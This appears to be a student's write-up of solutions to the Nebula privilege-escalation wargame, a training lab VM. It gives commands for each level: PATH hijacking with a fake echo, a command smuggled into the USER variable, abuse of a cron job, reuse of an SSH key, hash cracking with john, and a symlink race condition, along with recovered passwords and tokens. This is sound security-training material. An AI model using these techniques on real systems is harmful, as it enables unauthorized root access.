# TD2 - Nebula

## Exercice 0
Run `find / -name "flag00" > flags.txt` to look for any file named flag00 on the server.

Running `/bin/.../flag00` will log you in.

## Exercice 1
Modify echo to be our custom version
``` bash
cd tmp

# -e to interpret control characters like \n or \t
echo -e '#!/bin/bash\ngetflag' > echo
chmod +x echo

# Add tmp to PATH
export PATH=/tmp:$PATH

# Now run the program
/home/flag01/flag01
```

## Exercice 2
Modify the USER environment variable
`export $USER=";/bin/bash;"`

## Exercice 3
Cron exécute en root les scripts dans `writable.d`, effectuer `getflag > /tmp/flag.txt; chmod 777 /tmp/flag.txt`

## Exercice 4
Depuis level04, créer un symlink `ln -s ../flag04/token my_symlink`
puis lancer avec `../flag04/flag04 my_symlink`

## Exercice 5
Copier puis décompresser (`tar -xvzf`) la backup et utiliser
`ssh -i ~/.ssh/id_rsa flag05@nebula`

## Exercice 6
Check `/etc/passwd`, write flag06's credentials to `/tmp/hash.txt` and run `john hash.txt`

## Exercice 8

### Using Wireshark
- Use `ssh -p level08@localhost "cat /home/flag08/capture.pcap" > local_capture.pcap` to get the file out of the VM
- Open the file in wireshark then `right-click > Follow > TCP Stream`
![Wireshark capture](level08/image.png)

### Using tcpdump
Run `tcpdump -A -r capture.pcap` for ASCII mode or
`tcpdump -X -r capture.pcap` for hexadecimal mode

> 7f represents a backspace, we get `backd00Rmate` as the password

## Exercice 10
Uses a TOC TOU Race condition exploit
We keep swapping between 2 symlinks to bypass the check 
Run 3 terminals
- Term 1: All in /tmp : Create a script `swap_ln`
``` bash
#!/bin/bash
while true; do
        ln -sf /tmp/dummy /tmp/exploit
        ln -sf /home/flag10/token /tmp/exploit
done
```
- Term 2: run `nc -lk 18211` (listen on port 18211) to read the token
- Term 3: `while true; do /home/flag10/flag10 /tmp/exploit 127.0.0.1; done`

> Solution : `615a2ce1-b2b5-4c76-8eed-8aa5c4015c27`, run su flag10 and paste it